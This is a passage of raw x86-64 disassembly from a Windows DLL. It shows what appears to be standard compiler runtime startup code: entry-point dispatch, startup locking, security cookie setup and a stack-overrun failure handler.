   180002684:	c3                   	ret
   180002685:	48 c1 c9 10          	ror    $0x10,%rcx
   180002689:	e9 9a 03 00 00       	jmp    0x180002a28
   18000268e:	cc                   	int3
   18000268f:	cc                   	int3
   180002690:	e9 db 04 00 00       	jmp    0x180002b70
   180002695:	cc                   	int3
   180002696:	cc                   	int3
   180002697:	cc                   	int3
   180002698:	48 83 ec 28          	sub    $0x28,%rsp
   18000269c:	85 d2                	test   %edx,%edx
   18000269e:	74 39                	je     0x1800026d9
   1800026a0:	83 ea 01             	sub    $0x1,%edx
   1800026a3:	74 28                	je     0x1800026cd
   1800026a5:	83 ea 01             	sub    $0x1,%edx
   1800026a8:	74 16                	je     0x1800026c0
   1800026aa:	83 fa 01             	cmp    $0x1,%edx
   1800026ad:	74 0a                	je     0x1800026b9
   1800026af:	b8 01 00 00 00       	mov    $0x1,%eax
   1800026b4:	48 83 c4 28          	add    $0x28,%rsp
   1800026b8:	c3                   	ret
   1800026b9:	e8 b6 06 00 00       	call   0x180002d74
   1800026be:	eb 05                	jmp    0x1800026c5
   1800026c0:	e8 87 06 00 00       	call   0x180002d4c
   1800026c5:	0f b6 c0             	movzbl %al,%eax
   1800026c8:	48 83 c4 28          	add    $0x28,%rsp
   1800026cc:	c3                   	ret
   1800026cd:	49 8b d0             	mov    %r8,%rdx
   1800026d0:	48 83 c4 28          	add    $0x28,%rsp
   1800026d4:	e9 0f 00 00 00       	jmp    0x1800026e8
   1800026d9:	4d 85 c0             	test   %r8,%r8
   1800026dc:	0f 95 c1             	setne  %cl
   1800026df:	48 83 c4 28          	add    $0x28,%rsp
   1800026e3:	e9 18 01 00 00       	jmp    0x180002800
   1800026e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800026ed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800026f2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800026f7:	41 56                	push   %r14
   1800026f9:	48 83 ec 20          	sub    $0x20,%rsp
   1800026fd:	48 8b f2             	mov    %rdx,%rsi
   180002700:	4c 8b f1             	mov    %rcx,%r14
   180002703:	33 c9                	xor    %ecx,%ecx
   180002705:	e8 26 07 00 00       	call   0x180002e30
   18000270a:	84 c0                	test   %al,%al
   18000270c:	0f 84 c8 00 00 00    	je     0x1800027da
   180002712:	e8 ad 05 00 00       	call   0x180002cc4
   180002717:	8a d8                	mov    %al,%bl
   180002719:	88 44 24 40          	mov    %al,0x40(%rsp)
   18000271d:	40 b7 01             	mov    $0x1,%dil
   180002720:	83 3d 89 40 00 00 00 	cmpl   $0x0,0x4089(%rip)        # 0x1800067b0
   180002727:	0f 85 c5 00 00 00    	jne    0x1800027f2
   18000272d:	c7 05 79 40 00 00 01 	movl   $0x1,0x4079(%rip)        # 0x1800067b0
   180002734:	00 00 00 
   180002737:	e8 f8 05 00 00       	call   0x180002d34
   18000273c:	84 c0                	test   %al,%al
   18000273e:	74 4f                	je     0x18000278f
   180002740:	e8 f3 09 00 00       	call   0x180003138
   180002745:	e8 32 05 00 00       	call   0x180002c7c
   18000274a:	e8 59 05 00 00       	call   0x180002ca8
   18000274f:	48 8d 15 9a 1a 00 00 	lea    0x1a9a(%rip),%rdx        # 0x1800041f0
   180002756:	48 8d 0d 8b 1a 00 00 	lea    0x1a8b(%rip),%rcx        # 0x1800041e8
   18000275d:	e8 1d 0e 00 00       	call   0x18000357f
   180002762:	85 c0                	test   %eax,%eax
   180002764:	75 29                	jne    0x18000278f
   180002766:	e8 95 05 00 00       	call   0x180002d00
   18000276b:	84 c0                	test   %al,%al
   18000276d:	74 20                	je     0x18000278f
   18000276f:	48 8d 15 6a 1a 00 00 	lea    0x1a6a(%rip),%rdx        # 0x1800041e0
   180002776:	48 8d 0d 5b 1a 00 00 	lea    0x1a5b(%rip),%rcx        # 0x1800041d8
   18000277d:	e8 f7 0d 00 00       	call   0x180003579
   180002782:	c7 05 24 40 00 00 02 	movl   $0x2,0x4024(%rip)        # 0x1800067b0
   180002789:	00 00 00 
   18000278c:	40 32 ff             	xor    %dil,%dil
   18000278f:	8a cb                	mov    %bl,%cl
   180002791:	e8 fa 07 00 00       	call   0x180002f90
   180002796:	40 84 ff             	test   %dil,%dil
   180002799:	75 3f                	jne    0x1800027da
   18000279b:	e8 40 08 00 00       	call   0x180002fe0
   1800027a0:	48 8b d8             	mov    %rax,%rbx
   1800027a3:	48 83 38 00          	cmpq   $0x0,(%rax)
   1800027a7:	74 24                	je     0x1800027cd
   1800027a9:	48 8b c8             	mov    %rax,%rcx
   1800027ac:	e8 47 07 00 00       	call   0x180002ef8
   1800027b1:	84 c0                	test   %al,%al
   1800027b3:	74 18                	je     0x1800027cd
   1800027b5:	4c 8b c6             	mov    %rsi,%r8
   1800027b8:	ba 02 00 00 00       	mov    $0x2,%edx
   1800027bd:	49 8b ce             	mov    %r14,%rcx
   1800027c0:	48 8b 03             	mov    (%rbx),%rax
   1800027c3:	4c 8b 0d e6 19 00 00 	mov    0x19e6(%rip),%r9        # 0x1800041b0
   1800027ca:	41 ff d1             	call   *%r9
   1800027cd:	ff 05 3d 3a 00 00    	incl   0x3a3d(%rip)        # 0x180006210
   1800027d3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800027d8:	eb 02                	jmp    0x1800027dc
   1800027da:	33 c0                	xor    %eax,%eax
   1800027dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800027e1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800027e6:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800027eb:	48 83 c4 20          	add    $0x20,%rsp
   1800027ef:	41 5e                	pop    %r14
   1800027f1:	c3                   	ret
   1800027f2:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800027f7:	e8 f4 07 00 00       	call   0x180002ff0
   1800027fc:	90                   	nop
   1800027fd:	cc                   	int3
   1800027fe:	cc                   	int3
   1800027ff:	cc                   	int3
   180002800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002805:	57                   	push   %rdi
   180002806:	48 83 ec 30          	sub    $0x30,%rsp
   18000280a:	40 8a f9             	mov    %cl,%dil
   18000280d:	8b 05 fd 39 00 00    	mov    0x39fd(%rip),%eax        # 0x180006210
   180002813:	85 c0                	test   %eax,%eax
   180002815:	7f 0d                	jg     0x180002824
   180002817:	33 c0                	xor    %eax,%eax
   180002819:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000281e:	48 83 c4 30          	add    $0x30,%rsp
   180002822:	5f                   	pop    %rdi
   180002823:	c3                   	ret
   180002824:	ff c8                	dec    %eax
   180002826:	89 05 e4 39 00 00    	mov    %eax,0x39e4(%rip)        # 0x180006210
   18000282c:	e8 93 04 00 00       	call   0x180002cc4
   180002831:	8a d8                	mov    %al,%bl
   180002833:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002837:	83 3d 72 3f 00 00 02 	cmpl   $0x2,0x3f72(%rip)        # 0x1800067b0
   18000283e:	75 33                	jne    0x180002873
   180002840:	e8 a7 05 00 00       	call   0x180002dec
   180002845:	e8 42 04 00 00       	call   0x180002c8c
   18000284a:	e8 25 09 00 00       	call   0x180003174
   18000284f:	83 25 5a 3f 00 00 00 	andl   $0x0,0x3f5a(%rip)        # 0x1800067b0
   180002856:	8a cb                	mov    %bl,%cl
   180002858:	e8 33 07 00 00       	call   0x180002f90
   18000285d:	33 d2                	xor    %edx,%edx
   18000285f:	40 8a cf             	mov    %dil,%cl
   180002862:	e8 4d 07 00 00       	call   0x180002fb4
   180002867:	0f b6 d8             	movzbl %al,%ebx
   18000286a:	e8 ad 05 00 00       	call   0x180002e1c
   18000286f:	8b c3                	mov    %ebx,%eax
   180002871:	eb a6                	jmp    0x180002819
   180002873:	b9 07 00 00 00       	mov    $0x7,%ecx
   180002878:	e8 73 07 00 00       	call   0x180002ff0
   18000287d:	90                   	nop
   18000287e:	90                   	nop
   18000287f:	cc                   	int3
   180002880:	48 8b c4             	mov    %rsp,%rax
   180002883:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180002887:	4c 89 40 18          	mov    %r8,0x18(%rax)
   18000288b:	89 50 10             	mov    %edx,0x10(%rax)
   18000288e:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180002892:	56                   	push   %rsi
   180002893:	57                   	push   %rdi
   180002894:	41 56                	push   %r14
   180002896:	48 83 ec 40          	sub    $0x40,%rsp
   18000289a:	49 8b f0             	mov    %r8,%rsi
   18000289d:	8b fa                	mov    %edx,%edi
   18000289f:	4c 8b f1             	mov    %rcx,%r14
   1800028a2:	85 d2                	test   %edx,%edx
   1800028a4:	75 0f                	jne    0x1800028b5
   1800028a6:	39 15 64 39 00 00    	cmp    %edx,0x3964(%rip)        # 0x180006210
   1800028ac:	7f 07                	jg     0x1800028b5
   1800028ae:	33 c0                	xor    %eax,%eax
   1800028b0:	e9 ee 00 00 00       	jmp    0x1800029a3
   1800028b5:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800028b8:	83 f8 01             	cmp    $0x1,%eax
   1800028bb:	77 45                	ja     0x180002902
   1800028bd:	48 8b 05 5c 19 00 00 	mov    0x195c(%rip),%rax        # 0x180004220
   1800028c4:	48 85 c0             	test   %rax,%rax
   1800028c7:	75 0a                	jne    0x1800028d3
   1800028c9:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   1800028d0:	00 
   1800028d1:	eb 14                	jmp    0x1800028e7
   1800028d3:	ff 15 d7 18 00 00    	call   *0x18d7(%rip)        # 0x1800041b0
   1800028d9:	8b d8                	mov    %eax,%ebx
   1800028db:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800028df:	85 c0                	test   %eax,%eax
   1800028e1:	0f 84 b2 00 00 00    	je     0x180002999
   1800028e7:	4c 8b c6             	mov    %rsi,%r8
   1800028ea:	8b d7                	mov    %edi,%edx
   1800028ec:	49 8b ce             	mov    %r14,%rcx
   1800028ef:	e8 a4 fd ff ff       	call   0x180002698
   1800028f4:	8b d8                	mov    %eax,%ebx
   1800028f6:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800028fa:	85 c0                	test   %eax,%eax
   1800028fc:	0f 84 97 00 00 00    	je     0x180002999
   180002902:	4c 8b c6             	mov    %rsi,%r8
   180002905:	8b d7                	mov    %edi,%edx
   180002907:	49 8b ce             	mov    %r14,%rcx
   18000290a:	e8 49 03 00 00       	call   0x180002c58
   18000290f:	8b d8                	mov    %eax,%ebx
   180002911:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002915:	83 ff 01             	cmp    $0x1,%edi
   180002918:	75 36                	jne    0x180002950
   18000291a:	85 c0                	test   %eax,%eax
   18000291c:	75 32                	jne    0x180002950
   18000291e:	4c 8b c6             	mov    %rsi,%r8
   180002921:	33 d2                	xor    %edx,%edx
   180002923:	49 8b ce             	mov    %r14,%rcx
   180002926:	e8 2d 03 00 00       	call   0x180002c58
   18000292b:	48 85 f6             	test   %rsi,%rsi
   18000292e:	0f 95 c1             	setne  %cl
   180002931:	e8 ca fe ff ff       	call   0x180002800
   180002936:	48 8b 05 e3 18 00 00 	mov    0x18e3(%rip),%rax        # 0x180004220
   18000293d:	48 85 c0             	test   %rax,%rax
   180002940:	74 0e                	je     0x180002950
   180002942:	4c 8b c6             	mov    %rsi,%r8
   180002945:	33 d2                	xor    %edx,%edx
   180002947:	49 8b ce             	mov    %r14,%rcx
   18000294a:	ff 15 60 18 00 00    	call   *0x1860(%rip)        # 0x1800041b0
   180002950:	85 ff                	test   %edi,%edi
   180002952:	74 05                	je     0x180002959
   180002954:	83 ff 03             	cmp    $0x3,%edi
   180002957:	75 40                	jne    0x180002999
   180002959:	4c 8b c6             	mov    %rsi,%r8
   18000295c:	8b d7                	mov    %edi,%edx
   18000295e:	49 8b ce             	mov    %r14,%rcx
   180002961:	e8 32 fd ff ff       	call   0x180002698
   180002966:	8b d8                	mov    %eax,%ebx
   180002968:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000296c:	85 c0                	test   %eax,%eax
   18000296e:	74 29                	je     0x180002999
   180002970:	48 8b 05 a9 18 00 00 	mov    0x18a9(%rip),%rax        # 0x180004220
   180002977:	48 85 c0             	test   %rax,%rax
   18000297a:	75 09                	jne    0x180002985
   18000297c:	8d 58 01             	lea    0x1(%rax),%ebx
   18000297f:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180002983:	eb 14                	jmp    0x180002999
   180002985:	4c 8b c6             	mov    %rsi,%r8
   180002988:	8b d7                	mov    %edi,%edx
   18000298a:	49 8b ce             	mov    %r14,%rcx
   18000298d:	ff 15 1d 18 00 00    	call   *0x181d(%rip)        # 0x1800041b0
   180002993:	8b d8                	mov    %eax,%ebx
   180002995:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002999:	eb 06                	jmp    0x1800029a1
   18000299b:	33 db                	xor    %ebx,%ebx
   18000299d:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800029a1:	8b c3                	mov    %ebx,%eax
   1800029a3:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800029a8:	48 83 c4 40          	add    $0x40,%rsp
   1800029ac:	41 5e                	pop    %r14
   1800029ae:	5f                   	pop    %rdi
   1800029af:	5e                   	pop    %rsi
   1800029b0:	c3                   	ret
   1800029b1:	cc                   	int3
   1800029b2:	cc                   	int3
   1800029b3:	cc                   	int3
   1800029b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800029b9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800029be:	57                   	push   %rdi
   1800029bf:	48 83 ec 20          	sub    $0x20,%rsp
   1800029c3:	49 8b f8             	mov    %r8,%rdi
   1800029c6:	8b da                	mov    %edx,%ebx
   1800029c8:	48 8b f1             	mov    %rcx,%rsi
   1800029cb:	83 fa 01             	cmp    $0x1,%edx
   1800029ce:	75 05                	jne    0x1800029d5
   1800029d0:	e8 d7 01 00 00       	call   0x180002bac
   1800029d5:	4c 8b c7             	mov    %rdi,%r8
   1800029d8:	8b d3                	mov    %ebx,%edx
   1800029da:	48 8b ce             	mov    %rsi,%rcx
   1800029dd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800029e2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800029e7:	48 83 c4 20          	add    $0x20,%rsp
   1800029eb:	5f                   	pop    %rdi
   1800029ec:	e9 8f fe ff ff       	jmp    0x180002880
   1800029f1:	cc                   	int3
   1800029f2:	cc                   	int3
   1800029f3:	cc                   	int3
   1800029f4:	40 53                	rex push %rbx
   1800029f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800029fa:	48 8b d9             	mov    %rcx,%rbx
   1800029fd:	33 c9                	xor    %ecx,%ecx
   1800029ff:	ff 15 43 16 00 00    	call   *0x1643(%rip)        # 0x180004048
   180002a05:	48 8b cb             	mov    %rbx,%rcx
   180002a08:	ff 15 32 16 00 00    	call   *0x1632(%rip)        # 0x180004040
   180002a0e:	ff 15 f4 15 00 00    	call   *0x15f4(%rip)        # 0x180004008
   180002a14:	48 8b c8             	mov    %rax,%rcx
   180002a17:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180002a1c:	48 83 c4 20          	add    $0x20,%rsp
   180002a20:	5b                   	pop    %rbx
   180002a21:	48 ff 25 28 16 00 00 	rex.W jmp *0x1628(%rip)        # 0x180004050
   180002a28:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002a2d:	48 83 ec 38          	sub    $0x38,%rsp
   180002a31:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002a36:	ff 15 1c 16 00 00    	call   *0x161c(%rip)        # 0x180004058
   180002a3c:	85 c0                	test   %eax,%eax
   180002a3e:	74 07                	je     0x180002a47
   180002a40:	b9 02 00 00 00       	mov    $0x2,%ecx
   180002a45:	cd 29                	int    $0x29
   180002a47:	48 8d 0d 72 38 00 00 	lea    0x3872(%rip),%rcx        # 0x1800062c0
   180002a4e:	e8 a9 00 00 00       	call   0x180002afc
   180002a53:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180002a58:	48 89 05 59 39 00 00 	mov    %rax,0x3959(%rip)        # 0x1800063b8
   180002a5f:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180002a64:	48 83 c0 08          	add    $0x8,%rax
   180002a68:	48 89 05 e9 38 00 00 	mov    %rax,0x38e9(%rip)        # 0x180006358
   180002a6f:	48 8b 05 42 39 00 00 	mov    0x3942(%rip),%rax        # 0x1800063b8
   180002a76:	48 89 05 b3 37 00 00 	mov    %rax,0x37b3(%rip)        # 0x180006230
   180002a7d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180002a82:	48 89 05 b7 38 00 00 	mov    %rax,0x38b7(%rip)        # 0x180006340
   180002a89:	c7 05 8d 37 00 00 09 	movl   $0xc0000409,0x378d(%rip)        # 0x180006220
   180002a90:	04 00 c0 
   180002a93:	c7 05 87 37 00 00 01 	movl   $0x1,0x3787(%rip)        # 0x180006224
   180002a9a:	00 00 00 
   180002a9d:	c7 05 91 37 00 00 01 	movl   $0x1,0x3791(%rip)        # 0x180006238
   180002aa4:	00 00 00 
   180002aa7:	b8 08 00 00 00       	mov    $0x8,%eax
   180002aac:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002ab0:	48 8d 0d 89 37 00 00 	lea    0x3789(%rip),%rcx        # 0x180006240
   180002ab7:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   180002abe:	00 
   180002abf:	b8 08 00 00 00       	mov    $0x8,%eax
   180002ac4:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002ac8:	48 8b 0d 31 35 00 00 	mov    0x3531(%rip),%rcx        # 0x180006000
   180002acf:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002ad4:	b8 08 00 00 00       	mov    $0x8,%eax
   180002ad9:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180002add:	48 8b 0d 5c 35 00 00 	mov    0x355c(%rip),%rcx        # 0x180006040
   180002ae4:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002ae9:	48 8d 0d 38 17 00 00 	lea    0x1738(%rip),%rcx        # 0x180004228
   180002af0:	e8 ff fe ff ff       	call   0x1800029f4
   180002af5:	48 83 c4 38          	add    $0x38,%rsp
   180002af9:	c3                   	ret
   180002afa:	cc                   	int3
   180002afb:	cc                   	int3
   180002afc:	40 53                	rex push %rbx
   180002afe:	56                   	push   %rsi
   180002aff:	57                   	push   %rdi
   180002b00:	48 83 ec 40          	sub    $0x40,%rsp
   180002b04:	48 8b d9             	mov    %rcx,%rbx
   180002b07:	ff 15 8b 15 00 00    	call   *0x158b(%rip)        # 0x180004098
   180002b0d:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180002b14:	33 ff                	xor    %edi,%edi
   180002b16:	45 33 c0             	xor    %r8d,%r8d
   180002b19:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180002b1e:	48 8b ce             	mov    %rsi,%rcx
   180002b21:	ff 15 09 15 00 00    	call   *0x1509(%rip)        # 0x180004030
   180002b27:	48 85 c0             	test   %rax,%rax
   180002b2a:	74 39                	je     0x180002b65
   180002b2c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002b32:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180002b37:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180002b3c:	4c 8b c8             	mov    %rax,%r9
   180002b3f:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002b44:	4c 8b c6             	mov    %rsi,%r8
   180002b47:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002b4c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002b51:	33 c9                	xor    %ecx,%ecx
   180002b53:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002b58:	ff 15 da 14 00 00    	call   *0x14da(%rip)        # 0x180004038
   180002b5e:	ff c7                	inc    %edi
   180002b60:	83 ff 02             	cmp    $0x2,%edi
   180002b63:	7c b1                	jl     0x180002b16
   180002b65:	48 83 c4 40          	add    $0x40,%rsp
   180002b69:	5f                   	pop    %rdi
   180002b6a:	5e                   	pop    %rsi
   180002b6b:	5b                   	pop    %rbx
   180002b6c:	c3                   	ret
   180002b6d:	cc                   	int3
   180002b6e:	cc                   	int3
   180002b6f:	cc                   	int3
   180002b70:	40 53                	rex push %rbx
   180002b72:	48 83 ec 20          	sub    $0x20,%rsp
   180002b76:	48 8b d9             	mov    %rcx,%rbx
   180002b79:	eb 0f                	jmp    0x180002b8a
   180002b7b:	48 8b cb             	mov    %rbx,%rcx
   180002b7e:	e8 02 0a 00 00       	call   0x180003585
   180002b83:	85 c0                	test   %eax,%eax
   180002b85:	74 13                	je     0x180002b9a
   180002b87:	48 8b cb             	mov    %rbx,%rcx
   180002b8a:	e8 e4 09 00 00       	call   0x180003573
   180002b8f:	48 85 c0             	test   %rax,%rax
   180002b92:	74 e7                	je     0x180002b7b
   180002b94:	48 83 c4 20          	add    $0x20,%rsp
   180002b98:	5b                   	pop    %rbx
   180002b99:	c3                   	ret
   180002b9a:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   180002b9e:	74 06                	je     0x180002ba6
   180002ba0:	e8 53 07 00 00       	call   0x1800032f8
   180002ba5:	cc                   	int3
   180002ba6:	e8 6d 07 00 00       	call   0x180003318
   180002bab:	cc                   	int3
   180002bac:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002bb1:	55                   	push   %rbp
   180002bb2:	48 8b ec             	mov    %rsp,%rbp
   180002bb5:	48 83 ec 30          	sub    $0x30,%rsp
   180002bb9:	48 8b 05 40 34 00 00 	mov    0x3440(%rip),%rax        # 0x180006000
   180002bc0:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180002bc7:	2b 00 00 
   180002bca:	48 3b c3             	cmp    %rbx,%rax
   180002bcd:	75 74                	jne    0x180002c43
   180002bcf:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   180002bd4:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180002bd8:	ff 15 9a 14 00 00    	call   *0x149a(%rip)        # 0x180004078
   180002bde:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180002be2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180002be6:	ff 15 84 14 00 00    	call   *0x1484(%rip)        # 0x180004070
   180002bec:	8b c0                	mov    %eax,%eax
   180002bee:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180002bf2:	ff 15 70 14 00 00    	call   *0x1470(%rip)        # 0x180004068
   180002bf8:	8b c0                	mov    %eax,%eax
   180002bfa:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180002bfe:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180002c02:	ff 15 58 14 00 00    	call   *0x1458(%rip)        # 0x180004060
   180002c08:	8b 45 18             	mov    0x18(%rbp),%eax
   180002c0b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002c0f:	48 c1 e0 20          	shl    $0x20,%rax
   180002c13:	48 33 45 18          	xor    0x18(%rbp),%rax
   180002c17:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   180002c1b:	48 33 c1             	xor    %rcx,%rax
   180002c1e:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180002c25:	ff 00 00 
   180002c28:	48 23 c1             	and    %rcx,%rax
   180002c2b:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180002c32:	2b 00 00 
   180002c35:	48 3b c3             	cmp    %rbx,%rax
   180002c38:	48 0f 44 c1          	cmove  %rcx,%rax
   180002c3c:	48 89 05 bd 33 00 00 	mov    %rax,0x33bd(%rip)        # 0x180006000
   180002c43:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180002c48:	48 f7 d0             	not    %rax
   180002c4b:	48 89 05 ee 33 00 00 	mov    %rax,0x33ee(%rip)        # 0x180006040
   180002c52:	48 83 c4 30          	add    $0x30,%rsp
   180002c56:	5d                   	pop    %rbp
   180002c57:	c3                   	ret
   180002c58:	48 83 ec 28          	sub    $0x28,%rsp
   180002c5c:	83 fa 01             	cmp    $0x1,%edx
   180002c5f:	75 10                	jne    0x180002c71
   180002c61:	48 83 3d b7 15 00 00 	cmpq   $0x0,0x15b7(%rip)        # 0x180004220
   180002c68:	00 
   180002c69:	75 06                	jne    0x180002c71
   180002c6b:	ff 15 1f 14 00 00    	call   *0x141f(%rip)        # 0x180004090
   180002c71:	b8 01 00 00 00       	mov    $0x1,%eax
   180002c76:	48 83 c4 28          	add    $0x28,%rsp
   180002c7a:	c3                   	ret
   180002c7b:	cc                   	int3
   180002c7c:	48 8d 0d 0d 3b 00 00 	lea    0x3b0d(%rip),%rcx        # 0x180006790
   180002c83:	48 ff 25 fe 13 00 00 	rex.W jmp *0x13fe(%rip)        # 0x180004088
   180002c8a:	cc                   	int3
   180002c8b:	cc                   	int3
   180002c8c:	48 8d 0d fd 3a 00 00 	lea    0x3afd(%rip),%rcx        # 0x180006790
   180002c93:	e9 b7 08 00 00       	jmp    0x18000354f
   180002c98:	48 8d 05 01 3b 00 00 	lea    0x3b01(%rip),%rax        # 0x1800067a0
   180002c9f:	c3                   	ret
   180002ca0:	48 8d 05 01 3b 00 00 	lea    0x3b01(%rip),%rax        # 0x1800067a8
   180002ca7:	c3                   	ret
   180002ca8:	48 83 ec 28          	sub    $0x28,%rsp
   180002cac:	e8 e7 ff ff ff       	call   0x180002c98
   180002cb1:	48 83 08 24          	orq    $0x24,(%rax)
   180002cb5:	e8 e6 ff ff ff       	call   0x180002ca0
   180002cba:	48 83 08 02          	orq    $0x2,(%rax)
   180002cbe:	48 83 c4 28          	add    $0x28,%rsp
   180002cc2:	c3                   	ret
   180002cc3:	cc                   	int3
   180002cc4:	48 83 ec 28          	sub    $0x28,%rsp
   180002cc8:	e8 33 08 00 00       	call   0x180003500
   180002ccd:	85 c0                	test   %eax,%eax
   180002ccf:	74 21                	je     0x180002cf2
   180002cd1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180002cd8:	00 00 
   180002cda:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180002cde:	eb 05                	jmp    0x180002ce5
   180002ce0:	48 3b c8             	cmp    %rax,%rcx
   180002ce3:	74 14                	je     0x180002cf9
   180002ce5:	33 c0                	xor    %eax,%eax
   180002ce7:	f0 48 0f b1 0d c8 3a 	lock cmpxchg %rcx,0x3ac8(%rip)        # 0x1800067b8
   180002cee:	00 00 
   180002cf0:	75 ee                	jne    0x180002ce0
   180002cf2:	32 c0                	xor    %al,%al
   180002cf4:	48 83 c4 28          	add    $0x28,%rsp
   180002cf8:	c3                   	ret
   180002cf9:	b0 01                	mov    $0x1,%al
   180002cfb:	eb f7                	jmp    0x180002cf4
   180002cfd:	cc                   	int3
   180002cfe:	cc                   	int3
   180002cff:	cc                   	int3
   180002d00:	48 83 ec 28          	sub    $0x28,%rsp
   180002d04:	e8 f7 07 00 00       	call   0x180003500
   180002d09:	85 c0                	test   %eax,%eax
   180002d0b:	74 07                	je     0x180002d14
   180002d0d:	e8 3a 06 00 00       	call   0x18000334c
   180002d12:	eb 19                	jmp    0x180002d2d
   180002d14:	e8 df 07 00 00       	call   0x1800034f8
   180002d19:	8b c8                	mov    %eax,%ecx
   180002d1b:	e8 71 08 00 00       	call   0x180003591
   180002d20:	85 c0                	test   %eax,%eax
   180002d22:	74 04                	je     0x180002d28
   180002d24:	32 c0                	xor    %al,%al
   180002d26:	eb 07                	jmp    0x180002d2f
   180002d28:	e8 6a 08 00 00       	call   0x180003597
   180002d2d:	b0 01                	mov    $0x1,%al
   180002d2f:	48 83 c4 28          	add    $0x28,%rsp
   180002d33:	c3                   	ret
   180002d34:	48 83 ec 28          	sub    $0x28,%rsp
   180002d38:	33 c9                	xor    %ecx,%ecx
   180002d3a:	e8 2d 01 00 00       	call   0x180002e6c
   180002d3f:	84 c0                	test   %al,%al
   180002d41:	0f 95 c0             	setne  %al
   180002d44:	48 83 c4 28          	add    $0x28,%rsp
   180002d48:	c3                   	ret
   180002d49:	cc                   	int3
   180002d4a:	cc                   	int3
   180002d4b:	cc                   	int3
   180002d4c:	48 83 ec 28          	sub    $0x28,%rsp
   180002d50:	e8 5b 08 00 00       	call   0x1800035b0
   180002d55:	84 c0                	test   %al,%al
   180002d57:	75 04                	jne    0x180002d5d
   180002d59:	32 c0                	xor    %al,%al
   180002d5b:	eb 12                	jmp    0x180002d6f
   180002d5d:	e8 4e 08 00 00       	call   0x1800035b0
   180002d62:	84 c0                	test   %al,%al
   180002d64:	75 07                	jne    0x180002d6d
   180002d66:	e8 45 08 00 00       	call   0x1800035b0
   180002d6b:	eb ec                	jmp    0x180002d59
   180002d6d:	b0 01                	mov    $0x1,%al
   180002d6f:	48 83 c4 28          	add    $0x28,%rsp
   180002d73:	c3                   	ret
   180002d74:	48 83 ec 28          	sub    $0x28,%rsp
   180002d78:	e8 33 08 00 00       	call   0x1800035b0
   180002d7d:	e8 2e 08 00 00       	call   0x1800035b0
   180002d82:	b0 01                	mov    $0x1,%al
   180002d84:	48 83 c4 28          	add    $0x28,%rsp
   180002d88:	c3                   	ret
   180002d89:	cc                   	int3
   180002d8a:	cc                   	int3
   180002d8b:	cc                   	int3
   180002d8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002d91:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180002d96:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002d9b:	57                   	push   %rdi
